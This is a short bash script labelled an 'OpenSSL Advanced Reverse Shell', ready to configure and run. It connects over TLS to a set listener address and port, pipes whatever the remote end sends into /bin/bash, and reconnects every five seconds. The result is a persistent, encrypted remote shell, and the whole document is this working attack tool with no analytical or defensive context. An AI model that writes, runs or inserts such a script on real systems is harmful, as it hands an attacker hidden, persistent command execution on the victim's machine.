#!/bin/bash
# OpenSSL Advanced Reverse Shell
# Configure LHOST and LPORT before use

LHOST="192.168.1.100"
LPORT=4459

while true; do
    openssl s_client -quiet -connect $LHOST:$LPORT | /bin/bash
    sleep 5
done
